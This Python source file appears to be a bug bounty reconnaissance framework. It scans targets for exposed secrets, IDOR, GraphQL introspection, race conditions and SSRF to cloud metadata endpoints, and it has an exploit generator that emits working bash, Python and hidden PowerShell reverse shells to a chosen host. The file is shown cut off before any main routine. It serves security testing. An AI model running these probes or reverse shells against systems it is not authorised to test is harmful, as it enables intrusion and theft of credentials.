#!/usr/bin/env python3
"""
🔍 recon_hunter_v2.py — Advanced Bug Bounty Recon & Testing Framework

New in v2:
  • BOLA/IDOR scanner (cross-session)
  • GraphQL introspection + depth testing
  • Race condition tester (barrier sync)
  • Cloud metadata SSRF prober (AWS/GCP/Azure)
  • Exploit scaffold generator
  • Activity logger (Obsidian-compatible)
  • Nuclei / Katana / Subfinder orchestration
  • Retire.js vulnerable library detection
  • Cloud storage bucket enumeration

Usage:
    python3 recon_hunter_v2.py -u https://target.com
    python3 recon_hunter_v2.py -u https://target.com --full
    python3 recon_hunter_v2.py -u https://target.com --bola --graphql
    python3 recon_hunter_v2.py -u https://target.com --nuclei
"""

import argparse
import asyncio
import json
import os
import re
import socket
import ssl
import subprocess
import sys
import time
import urllib.parse
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import Optional

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    print("❌ Missing: requests")
    print("   Install: pip3 install requests")
    sys.exit(1)

try:
    from bs4 import BeautifulSoup
except ImportError:
    print("❌ Missing: beautifulsoup4")
    print("   Install: pip3 install beautifulsoup4")
    sys.exit(1)


# ============================================================
# CONFIG
# ============================================================

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

G, R, Y, B, C, M, D, X = (
    "\033[92m", "\033[91m", "\033[93m",
    "\033[94m", "\033[96m", "\033[95m",
    "\033[90m", "\033[0m",
)

# ---- Cloud metadata endpoints ----
CLOUD_METADATA = {
    "AWS IMDSv1": "http://169.254.169.254/latest/meta-data/",
    "AWS IMDSv2 token": "http://169.254.169.254/latest/api/token",
    "AWS user-data": "http://169.254.169.254/latest/user-data",
    "GCP metadata": "http://metadata.google.internal/computeMetadata/v1/",
    "Azure metadata": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "Alibaba metadata": "http://100.100.100.200/latest/meta-data/",
    "DigitalOcean": "http://169.254.169.254/metadata/v1/",
}

# ---- Technology signatures ----
TECH = {
    "Nginx":         {"headers": ["server:nginx"], "cat": "Server"},
    "Apache":        {"headers": ["server:apache"], "cat": "Server"},
    "IIS":           {"headers": ["server:Microsoft-IIS"], "cat": "Server"},
    "LiteSpeed":     {"headers": ["server:LiteSpeed"], "cat": "Server"},
    "PHP":           {"headers": ["x-powered-by:PHP"], "cat": "Language"},
    "ASP.NET":       {"headers": ["x-powered-by:ASP.NET"], "cat": "Framework"},
    "Express":       {"headers": ["x-powered-by:Express"], "cat": "Framework"},
    "WordPress":     {"html": ["/wp-content/", "/wp-includes/", "wp-json"], "cat": "CMS"},
    "Drupal":        {"html": ["Drupal.settings", "/sites/default/files/"], "cat": "CMS"},
    "Joomla":        {"html": ["/components/com_", "Joomla!"], "cat": "CMS"},
    "Magento":       {"html": ["Mage.Cookies", "/skin/frontend/"], "cat": "E-commerce"},
    "Shopify":       {"html": ["cdn.shopify.com", "Shopify.theme"], "cat": "E-commerce"},
    "React":         {"html": ["data-reactroot", "__REACT_DEVTOOLS"], "cat": "Framework"},
    "Next.js":       {"html": ["__NEXT_DATA__", "/_next/static/"], "cat": "Framework"},
    "Vue.js":        {"html": ["data-v-", "__vue__"], "cat": "Framework"},
    "Nuxt.js":       {"html": ["__NUXT__", "/_nuxt/"], "cat": "Framework"},
    "Angular":       {"html": ["ng-version=", "ng-app"], "cat": "Framework"},
    "Svelte":        {"html": ["__svelte", "svelte-"], "cat": "Framework"},
    "jQuery":        {"html": ["jquery.min.js", "jquery.js"], "cat": "Library"},
    "Bootstrap":     {"html": ["bootstrap.min.css"], "cat": "Library"},
    "Tailwind":      {"html": ["tailwind"], "cat": "Library"},
    "Cloudflare":    {"headers": ["server:cloudflare", "cf-ray"], "cat": "CDN/WAF"},
    "Akamai":        {"headers": ["server:AkamaiGHost"], "cat": "CDN/WAF"},
    "Fastly":        {"headers": ["x-served-by:cache-", "x-fastly"], "cat": "CDN"},
    "Sucuri":        {"headers": ["x-sucuri-id"], "cat": "WAF"},
    "CloudFront":    {"headers": ["x-amz-cf-id"], "cat": "CDN"},
    "Vercel":        {"headers": ["server:Vercel", "x-vercel-id"], "cat": "Hosting"},
    "Netlify":       {"headers": ["server:Netlify", "x-nf-request-id"], "cat": "Hosting"},
    "Heroku":        {"headers": ["via:1.1 vegur"], "cat": "Hosting"},
    "Google Analytics": {"html": ["google-analytics.com", "gtag/js"], "cat": "Analytics"},
    "GraphQL":       {"html": ["graphql", "/graphql", "__schema"], "cat": "API"},
}

# ---- Secret patterns (with entropy requirement) ----
SECRETS = [
    ("AWS Access Key",   r"AKIA[0-9A-Z]{16}", 0),
    ("AWS Secret Key",   r"aws.{0,30}['\"][0-9a-zA-Z/+]{40}['\"]", 4.0),
    ("Google API Key",   r"AIza[0-9A-Za-z_\-]{35}", 0),
    ("GitHub Token",     r"gh[pousr]_[A-Za-z0-9_]{36,255}", 0),
    ("GitLab PAT",       r"glpat-[A-Za-z0-9\-_]{20}", 0),
    ("Slack Token",      r"xox[baprs]-[0-9a-zA-Z\-]{10,48}", 0),
    ("Stripe Live Key",  r"sk_live_[0-9a-zA-Z]{24}", 0),
    ("Stripe Test Key",  r"sk_test_[0-9a-zA-Z]{24}", 0),
    ("SendGrid Key",     r"SG\.[a-zA-Z0-9_\-]{22}\.[a-zA-Z0-9_\-]{43}", 0),
    ("Mailgun Key",      r"key-[0-9a-zA-Z]{32}", 0),
    ("Firebase URL",     r"https://[a-z0-9\-]+\.firebaseio\.com", 0),
    ("Firebase FCM",     r"AAAA[A-Za-z0-9_\-]{7}:[A-Za-z0-9_\-]{140}", 0),
    ("MongoDB URI",      r"mongodb(?:\+srv)?://[^\s'\"]+", 3.5),
    ("PostgreSQL URI",   r"postgres(?:ql)?://[^\s'\"]+", 3.5),
    ("MySQL URI",        r"mysql://[^\s'\"]+", 3.5),
    ("Redis URI",        r"redis://[^\s'\"]+", 3.5),
    ("Private Key",      r"-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----", 0),
    ("JWT",              r"eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}", 3.0),
    ("OpenAI Key",       r"sk-[A-Za-z0-9]{20,}", 4.0),
    ("Basic Auth URL",   r"https?://[a-zA-Z0-9_\-\.]+:[a-zA-Z0-9_\-\.@]{3,}@[a-zA-Z0-9_\-\.]+", 0),
    ("Discord Webhook",  r"https://discord(?:app)?\.com/api/webhooks/[0-9]+/[A-Za-z0-9_\-]+", 0),
    ("Telegram Bot",     r"[0-9]{8,10}:[A-Za-z0-9_\-]{35}", 0),
    ("Algolia Key",      r"(?i)algolia.{0,20}['\"][a-z0-9]{32}['\"]", 4.0),
    ("Mapbox Token",     r"pk\.[a-zA-Z0-9]{60,}", 4.0),
]

ENDPOINT_RE = re.compile(
    r"""["'](/(?:api|v\d|graphql|rest|auth|user|admin|internal|upload|download|export|webhook|oauth)[^"'\s<>]{0,100})["']""",
    re.IGNORECASE,
)

# ---- Retire.js vulnerable library signatures ----
VULN_LIBS = [
    ("jQuery < 3.5.0", r"jquery[.-]?([0-2]\.[0-9]|3\.[0-4])\.[0-9]", "CVE-2020-11022"),
    ("Bootstrap < 4.3.1", r"bootstrap[.-]?(3\.[0-3]|4\.[0-2])", "CVE-2019-8331"),
    ("Angular < 1.8.0", r"angular[.-]?1\.[0-7]", "CVE-2020-7676"),
    ("Lodash < 4.17.21", r"lodash[.-]?4\.17\.(1[0-9]|20)", "CVE-2021-23337"),
    ("Vue < 2.6.14", r"vue[.-]?2\.[0-5]", "CVE-2021-23337"),
]


# ============================================================
# ACTIVITY LOGGER (Obsidian-compatible)
# ============================================================

class ActivityLogger:
    def __init__(self, output_dir="activity_logs"):
        self.dir = Path(output_dir)
        self.dir.mkdir(parents=True, exist_ok=True)
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file = self.dir / f"session_{self.session_id}.md"
        self.request_log = self.dir / f"requests_{self.session_id}.jsonl"

        with open(self.log_file, "w") as f:
            f.write(f"# Recon Session {self.session_id}\n\n")
            f.write(f"**Started:** {datetime.utcnow().isoformat()}\n\n")
            f.write("---\n\n")

    def log(self, message, level="info"):
        icons = {"info": "ℹ️", "success": "✅", "warning": "⚠️",
                 "error": "❌", "critical": "🚨", "vuln": "🎯"}
        icon = icons.get(level, "•")
        with open(self.log_file, "a") as f:
            f.write(f"- {icon} `{datetime.utcnow().strftime('%H:%M:%S')}` {message}\n")

    def log_request(self, method, url, status, params=None, payload=None):
        entry = {
            "timestamp": datetime.utcnow().isoformat(),
            "method": method, "url": url, "status": status,
            "params": params, "payload": payload,
        }
        with open(self.request_log, "a") as f:
            f.write(json.dumps(entry) + "\n")

    def log_finding(self, finding):
        with open(self.log_file, "a") as f:
            f.write(f"\n### {finding.severity} — {finding.vuln_type}\n")
            f.write(f"- **URL:** `{finding.url}`\n")
            if finding.param:
                f.write(f"- **Param:** `{finding.param}`\n")
            if finding.payload:
                f.write(f"- **Payload:** `{finding.payload}`\n")
            if finding.evidence:
                f.write(f"- **Evidence:** {finding.evidence}\n")
            if finding.remediation:
                f.write(f"- **Remediation:** {finding.remediation}\n")
            if finding.cwe:
                f.write(f"- **CWE:** {finding.cwe}\n")


# ============================================================
# DATA MODEL
# ============================================================

@dataclass
class Finding:
    vuln_type: str
    severity: str
    url: str
    param: str = ""
    payload: str = ""
    evidence: str = ""
    confidence: str = "medium"
    remediation: str = ""
    cwe: str = ""
    exploit_scaffold: str = ""


# ============================================================
# HELPER: Shannon entropy for secret detection
# ============================================================

def shannon_entropy(data: str) -> float:
    import math
    if not data:
        return 0.0
    entropy = 0.0
    for x in set(data):
        p_x = data.count(x) / len(data)
        entropy += -p_x * math.log2(p_x)
    return entropy


# ============================================================
# MODULE: BOLA / IDOR SCANNER
# ============================================================

class BOLAScanner:
    """Tests Broken Object Level Authorization across sessions."""

    ID_PARAMS = ["id", "user", "user_id", "uid", "account", "account_id",
                 "profile", "order", "order_id", "invoice", "doc",
                 "document_id", "file", "file_id", "record", "record_id",
                 "item", "item_id", "customer", "customer_id", "card"]

    def __init__(self, logger):
        self.logger = logger
        self.findings = []

    def test(self, url, session_a_cookies=None, session_b_cookies=None):
        """Test BOLA by swapping object IDs between two sessions."""
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))

        candidates = [p for p in params if p.lower() in self.ID_PARAMS]
        # Also check path segments for numeric IDs
        path_ids = re.findall(r"/(\d{1,10})(?:/|$)", parsed.path)
        if path_ids:
            candidates.append("__path_id__")

        if not candidates:
            return []

        for param_name in candidates:
            if param_name == "__path_id__":
                original = path_ids[0]
            else:
                original = params.get(param_name, "")
                if not original.isdigit():
                    continue

            base_id = int(original)

            for delta in (-2, -1, 1, 2, 10, 100):
                test_id = base_id + delta
                if test_id < 1:
                    continue

                if param_name == "__path_id__":
                    new_path = parsed.path.replace(f"/{original}", f"/{test_id}", 1)
                    test_url = urllib.parse.urlunparse((
                        parsed.scheme, parsed.netloc, new_path,
                        parsed.params, parsed.query, parsed.fragment
                    ))
                else:
                    test_params = dict(params)
                    test_params[param_name] = str(test_id)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params)}"

                try:
                    resp = requests.get(test_url, headers={"User-Agent": UA},
                                        timeout=10, verify=False, allow_redirects=False)
                    self.logger.log_request("GET", test_url, resp.status_code,
                                             params={param_name: str(test_id)})

                    if resp.status_code == 200:
                        body = resp.text
                        pii = self._detect_pii(body)
                        not_found = any(sig in body.lower() for sig in
                                        ["not found", "does not exist", "no such", "404"])
                        if not not_found and (pii or len(body) > 500):
                            f = Finding(
                                vuln_type="BOLA / IDOR (Insecure Direct Object Reference)",
                                severity="HIGH",
                                url=test_url,
                                param=param_name,
                                payload=str(test_id),
                                evidence=f"Accessed object {test_id} (was {original}). "
                                         f"PII: {', '.join(pii) if pii else 'content served'}",
                                confidence="medium",
                                remediation="Implement server-side authorization checks on every "
                                            "object access. Use UUIDs instead of sequential IDs. "
                                            "Never trust client-supplied object identifiers.",
                                cwe="CWE-639",
                                exploit_scaffold=self._gen_exploit(test_url, param_name, str(test_id)),
                            )
                            self.findings.append(f)
                            self.logger.log_finding(f)
                            break
                except Exception:
                    continue
            if self.findings and self.findings[-1].param == param_name:
                continue

        return self.findings

    @staticmethod
    def _detect_pii(body):
        indicators = []
        if re.search(r"[\w\.-]+@[\w\.-]+\.\w+", body):
            indicators.append("email")
        if re.search(r"\b\d{3}[-.]?\d{3}[-.]?\d{4}\b", body):
            indicators.append("phone")
        if re.search(r"\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b", body):
            indicators.append("credit_card")
        if re.search(r"\b\d{3}-\d{2}-\d{4}\b", body):
            indicators.append("ssn")
        return indicators

    @staticmethod
    def _gen_exploit(url, param, value):
        return f"""#!/usr/bin/env python3
# PoC: BOLA/IDOR in {param}
import requests
r = requests.get("{url}", headers={{"User-Agent": "{UA}"}}, verify=False)
print(f"Status: {{r.status_code}}")
print(r.text[:2000])
"""


# ============================================================
# MODULE: GRAPHQL INTROSPECTION
# ============================================================

class GraphQLTester:
    INTROSPECTION_QUERY = """
    {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          name
          kind
          fields {
            name
            type { name kind ofType { name kind } }
            args { name type { name kind } }
          }
        }
      }
    }
    """

    SENSITIVE_KEYWORDS = ["password", "token", "secret", "key", "admin",
                          "internal", "debug", "private", "credential", "auth"]

    def __init__(self, logger):
        self.logger = logger
        self.findings = []

    def test(self, url, headers=None):
        """Test GraphQL endpoints for introspection + depth issues."""
        headers = headers or {"Content-Type": "application/json"}

        # Try common GraphQL paths
        parsed = urllib.parse.urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        paths = [parsed.path if parsed.path else "/graphql",
                 "/graphql", "/api/graphql", "/v1/graphql", "/query"]

        for path in paths:
            endpoint = f"{base}{path}"
            try:
                resp = requests.post(endpoint,
                                     json={"query": self.INTROSPECTION_QUERY},
                                     headers=headers, timeout=10, verify=False)
                self.logger.log_request("POST", endpoint, resp.status_code)

                if resp.status_code == 200 and "__schema" in resp.text:
                    schema = resp.json().get("data", {}).get("__schema", {})
                    types = [t for t in schema.get("types", [])
                             if not t["name"].startswith("__")]

                    queries, mutations, sensitive = [], [], []
                    for t in types:
                        for field in (t.get("fields") or []):
                            if t["name"] == schema.get("queryType", {}).get("name"):
                                queries.append(field["name"])
                            if t["name"] == schema.get("mutationType", {}).get("name"):
                                mutations.append(field["name"])
                            if any(kw in field["name"].lower()
                                   for kw in self.SENSITIVE_KEYWORDS):
                                sensitive.append(f"{t['name']}.{field['name']}")

                    f = Finding(
                        vuln_type="GraphQL Introspection Enabled",
                        severity="MEDIUM",
                        url=endpoint,
                        evidence=f"Schema leaked: {len(types)} types, "
                                 f"{len(queries)} queries, {len(mutations)} mutations. "
                                 f"Sensitive fields: {', '.join(sensitive[:10])}",
                        confidence="high",
                        remediation="Disable introspection in production. "
                                    "Implement query depth limits, rate limiting, and "
                                    "field-level authorization.",
                        cwe="CWE-200",
                    )
                    self.findings.append(f)
                    self.logger.log_finding(f)

                    # Depth test
                    self._test_depth(endpoint, headers)
                    # Batch test
                    self._test_batching(endpoint, headers)
                    break

            except Exception:
                continue

        return self.findings

    def _test_depth(self, endpoint, headers):
        for depth in range(5, 16):
            nested = "{ __typename " * depth + "}" * depth
            try:
                resp = requests.post(endpoint,
                                     json={"query": f"query {{ {nested} }}"},
                                     headers=headers, timeout=10, verify=False)
                if resp.status_code != 200 or "errors" in resp.text:
                    self.logger.log(f"GraphQL depth limit enforced at {depth}", "success")
                    return
            except Exception:
                return

        f = Finding(
            vuln_type="GraphQL No Depth Limit (DoS)",
            severity="MEDIUM",
            url=endpoint,
            evidence=f"Accepted nested query up to depth 15 without errors",
            confidence="high",
            remediation="Implement query depth limits and complexity scoring.",
            cwe="CWE-770",
        )
        self.findings.append(f)
        self.logger.log_finding(f)

    def _test_batching(self, endpoint, headers):
        batch = [{"query": "{ __typename }"} for _ in range(10)]
        try:
            resp = requests.post(endpoint, json=batch, headers=headers,
                                 timeout=10, verify=False)
            if resp.status_code == 200 and isinstance(resp.json(), list):
                f = Finding(
                    vuln_type="GraphQL Batching Enabled (Brute Force Risk)",
                    severity="LOW",
                    url=endpoint,
                    evidence="Endpoint accepts batched queries — enables alias-based "
                             "brute force and rate limit bypass",
                    confidence="high",
                    remediation="Disable query batching or limit batch size and "
                                "rate-limit per operation.",
                    cwe="CWE-770",
                )
                self.findings.append(f)
                self.logger.log_finding(f)
        except Exception:
            pass


# ============================================================
# MODULE: RACE CONDITION TESTER
# ============================================================

class RaceConditionTester:
    """Sends highly concurrent requests to detect TOCTOU race conditions."""

    def __init__(self, logger):
        self.logger = logger
        self.findings = []

    def test(self, url, method="POST", data=None, headers=None, threads=20):
        """Send concurrent requests and compare responses."""
        headers = headers or {"Content-Type": "application/json"}
        data = data or {}

        results = []
        def send_one(i):
            try:
                start = time.monotonic()
                if method.upper() == "POST":
                    r = requests.post(url, json=data, headers=headers,
                                      timeout=15, verify=False)
                else:
                    r = requests.get(url, headers=headers,
                                     timeout=15, verify=False)
                elapsed = time.monotonic() - start
                return {"idx": i, "status": r.status_code,
                        "body": r.text[:500], "time": elapsed}
            except Exception as e:
                return {"idx": i, "status": 0, "body": str(e), "time": 0}

        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = [ex.submit(send_one, i) for i in range(threads)]
            for fut in as_completed(futures):
                results.append(fut.result())

        self.logger.log_request(method, url, "race_test",
                                 params={"threads": threads})

        # Analyze: look for inconsistent responses
        statuses = [r["status"] for r in results if r["status"]]
        unique_bodies = set(r["body"] for r in results if r["body"])

        # If we see different success responses for what should be idempotent ops
        success_count = sum(1 for s in statuses if 200 <= s < 300)
        if success_count > 1 and len(unique_bodies) > 1:
            # Check for limit overrun indicators
            overrun_signals = ["already", "used", "claimed", "redeemed",
                               "limit", "duplicate", "expired"]
            if any(sig in b.lower() for b in unique_bodies for sig in overrun_signals):
                f = Finding(
                    vuln_type="Potential Race Condition (TOCTOU / Limit Overrun)",
                    severity="HIGH",
                    url=url,
                    evidence=f"{success_count}/{threads} concurrent requests succeeded. "
                             f"Response variation: {len(unique_bodies)} unique bodies. "
                             f"Inconsistent state detected.",
                    confidence="medium",
                    remediation="Implement atomic operations, database transactions with "
                                "proper locking (SELECT FOR UPDATE), or idempotency keys. "
                                "Never rely on check-then-act patterns.",
                    cwe="CWE-362",
                )
                self.findings.append(f)
                self.logger.log_finding(f)

        return self.findings


# ============================================================
# MODULE: CLOUD METADATA SSRF PROBER
# ============================================================

class CloudMetadataTester:
    """Probes SSRF-capable params for cloud metadata access."""

    SSRF_PARAMS = ["url", "uri", "link", "src", "dest", "redirect",
                   "callback", "feed", "host", "path", "target", "out",
                   "next", "data", "reference", "site", "html", "file",
                   "page", "return", "r", "u", "load", "fetch", "image",
                   "proxy", "webhook", "endpoint"]

    def __init__(self, logger):
        self.logger = logger
        self.findings = []

    def test(self, url):
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))

        candidates = [p for p in params if p.lower() in self.SSRF_PARAMS]
        for p, v in params.items():
            if v.startswith(("http://", "https://", "/")):
                if p not in candidates:
                    candidates.append(p)

        if not candidates:
            return []

        for param_name in candidates:
            for name, target in CLOUD_METADATA.items():
                test_params = dict(params)
                test_params[param_name] = target
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params)}"

                headers = {"User-Agent": UA}
                # AWS IMDSv2 requires PUT + token header
                if "IMDSv2" in name:
                    headers["X-aws-ec2-metadata-token-ttl-seconds"] = "21600"
                # GCP requires header
                if "GCP" in name:
                    headers["Metadata-Flavor"] = "Google"
                # Azure requires header
                if "Azure" in name:
                    headers["Metadata"] = "true"

                try:
                    if "IMDSv2" in name:
                        resp = requests.put(target, headers=headers,
                                            timeout=8, verify=False)
                    else:
                        resp = requests.get(test_url, headers=headers,
                                            timeout=8, verify=False,
                                            allow_redirects=False)

                    self.logger.log_request("GET", test_url, resp.status_code,
                                             params={param_name: target})

                    # Check for metadata signatures
                    body_lower = resp.text.lower()
                    metadata_signals = ["ami-id", "instance-id", "iam",
                                        "security-credentials", "project-id",
                                        "subscriptionid", "computemetadata",
                                        "droplet", "region"]

                    if (resp.status_code == 200 and
                            any(sig in body_lower for sig in metadata_signals)):
                        f = Finding(
                            vuln_type=f"SSRF → {name} Metadata Access",
                            severity="CRITICAL",
                            url=test_url,
                            param=param_name,
                            payload=target,
                            evidence=f"Metadata endpoint reached. Response snippet: "
                                     f"{resp.text[:200]}",
                            confidence="high",
                            remediation="Validate and whitelist allowed URLs. Block "
                                        "private IP ranges (169.254.0.0/16). Use IMDSv2 "
                                        "with hop limit 1. Disable unnecessary URL schemes.",
                            cwe="CWE-918",
                            exploit_scaffold=self._gen_ssrf_exploit(test_url, target),
                        )
                        self.findings.append(f)
                        self.logger.log_finding(f)
                        break

                except Exception:
                    continue

        return self.findings

    @staticmethod
    def _gen_ssrf_exploit(url, target):
        return f"""#!/usr/bin/env python3
# PoC: SSRF accessing cloud metadata
import requests
r = requests.get("{url}", verify=False)
print(f"Status: {{r.status_code}}")
print(r.text[:2000])
# Direct metadata probe:
# curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
"""


# ============================================================
# MODULE: VULNERABLE LIBRARY DETECTION (Retire.js style)
# ============================================================

class VulnLibScanner:
    def __init__(self, logger):
        self.logger = logger
        self.findings = []

    def scan(self, js_url, content):
        for name, pattern, cve in VULN_LIBS:
            if re.search(pattern, content, re.IGNORECASE):
                f = Finding(
                    vuln_type=f"Vulnerable JS Library: {name}",
                    severity="MEDIUM",
                    url=js_url,
                    evidence=f"Pattern match for {name} ({cve})",
                    confidence="medium",
                    remediation=f"Upgrade to the latest version. Reference: {cve}",
                    cwe="CWE-1104",
                )
                self.findings.append(f)
                self.logger.log_finding(f)
        return self.findings


# ============================================================
# MODULE: EXPLOIT SCAFFOLD GENERATOR
# ============================================================

class ExploitGenerator:
    @staticmethod
    def reverse_shell(lhost, lport, shell_type="bash"):
        payloads = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket();"
                      f"s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);"
                      f"os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                      f"subprocess.call([\"/bin/sh\",\"-i\"])'",
            "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
                          f"$client=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
                          f"$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};"
                          f"while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0)"
                          f"{{;$data=(New-Object -TypeName System.Text.ASCIIEncoding)"
                          f".GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);"
                          f"$sendback2=$sendback+'PS '+(pwd).Path+'> ';"
                          f"$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
                          f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
                          f"$client.Close()",
        }
        return payloads.get(shell_type, payloads["bash"])

    @staticmethod
    def save_scaffold(finding, output_dir="exploits"):
        out = Path(output_dir)
        out.mkdir(parents=True, exist_ok=True)

        if finding.exploit_scaffold:
            safe_name = re.sub(r"[^a-zA-Z0-9_-]", "_", finding.vuln_type)[:50]
            path = out / f"{safe_name}_{uuid.uuid4().hex[:6]}.py"
            with open(path, "w") as f:
                f.write(finding.exploit_scaffold)
            return str(path)
        return None


# ============================================================
# ORCHESTRATOR: External tool integration
# ============================================================

class ToolOrchestrator:
    """Runs external recon tools if installed."""

    TOOLS = {
        "nuclei": "nuclei",
        "katana": "katana",
        "subfinder": "subfinder",
        "httpx": "httpx",
    }

    def __init__(self, logger, output_dir="tool_output"):
        self.logger = logger
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def tool_available(self, name):
        try:
            subprocess.run(["which", name], capture_output=True, timeout=5)
            return True
        except Exception:
            return False

    def run_nuclei(self, target):
        if not self.tool_available("nuclei"):
            self.logger.log("nuclei not installed — skipping", "warning")
            return None

        out_file = self.output_dir / f"nuclei_{uuid.uuid4().hex[:6]}.json"
        self.logger.log(f"Running nuclei against {target}", "info")
        try:
            subprocess.run(
                ["nuclei", "-u", target, "-json", "-o", str(out_file),
                 "-severity", "low,medium,high,critical", "-silent"],
                capture_output=True, timeout=600,
            )
            if out_file.exists():
                with open(out_file) as f:
                    findings = [json.loads(line) for line in f if line.strip()]
                self.logger.log(f"nuclei found {len(findings)} results", "success")
                return findings
        except subprocess.TimeoutExpired:
            self.logger.log("nuclei timed out", "warning")
        except Exception as e:
            self.logger.log(f"nuclei error: {e}", "error")
        return None

    def run_katana(self, target):
        if not self.tool_available("katana"):
            self.logger.log("katana not installed — skipping", "warning")
            return None

        out_file = self.output_dir / f"katana_{uuid.uuid4().hex[:6]}.txt"
        self.logger.log(f"Running katana crawl on {target}", "info")
        try:
            subprocess.run(
                ["katana", "-u", target, "-o", str(out_file),
                 "-silent", "-d", "3", "-jc"],
                capture_output=True, timeout=300,
            )
            if out_file.exists():
                with open(out_file) as f:
                    urls = [line.strip() for line in f if line.strip()]
                self.logger.log(f"katana found {len(urls)} URLs", "success")
                return urls
        except Exception as e:
            self.logger.log(f"katana error: {e}", "error")
        return None

    def run_subfinder(self, domain):
        if not self.tool_available("subfinder"):
            self.logger.log("subfinder not installed — skipping", "warning")
            return None

        out_file = self.output_dir / f"subs_{uuid.uuid4().hex[:6]}.txt"
        try:
            subprocess.run(
                ["subfinder", "-d", domain, "-silent", "-o", str(out_file)],
                capture_output=True, timeout=180,
            )
            if out_file.exists():
                with open(out_file) as f:
                    subs = [line.strip() for line in f if line.strip()]
                self.logger.log(f"subfinder found {len(subs)} subdomains", "success")
                return subs
        except Exception as e:
            self.logger.log(f"subfinder error: {e}", "error")
        return None


# ============================================================
# MAIN ORCHESTRATOR
# ============================================================

class Hunter:
    def __init__(self, url, logger, enabled_modules):
        self.url = url
        self.logger = logger
        self.enabled = enabled_modules
        self.all_findings = []
        self.techs = {}
        self.secrets = []
        self.endpoints = set()
        self.js_files = []
        self.tool_results = {}
        self.parsed = urllib.parse.urlparse(url)
        self.host = self.parsed.netloc.split(":")[0]

    def fingerprint(self, resp):
        header_str = "\n".join(f"{k}:{v}" for k, v in resp.headers.items()).lower()
        html = (resp.text or "")[:500_000].lower()

        for name, sig in TECH.items():
            for h in sig.get("headers", []):
                if h.lower() in header_str:
                    self.techs[name] = sig["cat"]
                    break
            else:
                for h in sig.get("html", []):
                    if h.lower() in html:
                        self.techs[name] = sig["cat"]
                        break

        if self.techs:
            grouped = {}
            for n, c in self.techs.items():
                grouped.setdefault(c, []).append(n)
            print(f"\n{B}🛠️  Technologies detected:{X}")
            for cat in sorted(grouped):
                print(f"  {Y}📁 {cat}{X}: {', '.join(sorted(grouped[cat]))}")
        else:
            print(f"{Y}⚠️  No technologies detected{X}")

    def analyze_js(self, html, timeout=10):
        print(f"\n{B}📜 Analyzing JavaScript...{X}")
        js_urls = set()

        try:
            soup = BeautifulSoup(html, "html.parser")
            for tag in soup.find_all("script", src=True):
                src = tag.get("src", "")
                if src:
                    full = urllib.parse.urljoin(self.url, src)
                    if ".js" in full.lower():
                        js_urls.add(full.split("#")[0])
        except Exception:
            pass

        base = f"{self.parsed.scheme}://{self.parsed.netloc}"
        for path in ["/main.js", "/app.js", "/bundle.js", "/static/js/main.js"]:
            js_urls.add(f"{base}{path}")

        secret_count = 0
        for js_url in js_urls:
            try:
                r = requests.get(js_url, headers={"User-Agent": UA},
                                 timeout=timeout, verify=False)
                if r.status_code != 200 or not r.text:
                    continue
                self.js_files.append(js_url)
                content = r.text

                # Secrets
                for name, pattern, min_entropy in SECRETS:
                    for m in re.finditer(pattern, content, re.IGNORECASE):
                        val = m.group(0)
                        low = val.lower()
                        if any(p in low for p in ["example", "your_", "xxxx",
                                                   "placeholder", "dummy", "changeme"]):
                            continue
                        if min_entropy > 0 and shannon_entropy(val) < min_entropy:
                            continue
                        if len(set(val)) < 5:
                            continue
                        f = Finding(
                            vuln_type=f"JS Secret: {name}",
                            severity="CRITICAL" if "AWS" in name or "Private" in name else "HIGH",
                            url=js_url,
                            payload=val[:120],
                            evidence=f"Shannon entropy: {shannon_entropy(val):.2f}",
                            confidence="high" if min_entropy > 0 else "medium",
                            remediation="Rotate the secret immediately. Remove from client-side "
                                        "code. Use server-side proxies for API calls.",
                            cwe="CWE-798",
                        )
                        self.all_findings.append(f)
                        self.logger.log_finding(f)
                        secret_count += 1
                        break

                # Endpoints
                for m in ENDPOINT_RE.finditer(content):
                    self.endpoints.add(m.group(1))

                # Vulnerable libraries
                if "vuln-libs" in self.enabled:
                    vuln_scanner = VulnLibScanner(self.logger)
                    vuln_findings = vuln_scanner.scan(js_url, content)
                    self.all_findings.extend(vuln_findings)

            except Exception as e:
                self.logger.log(f"JS fetch failed: {js_url} — {e}", "warning")

        print(f"  {G}✅ Scanned {len(self.js_files)} JS files{X}")
        if secret_count:
            print(f"  {M}🚨 {secret_count} secrets found{X}")
        if self.endpoints:
            print(f"  {C}🔗 {len(self.endpoints)} endpoints discovered{X}")

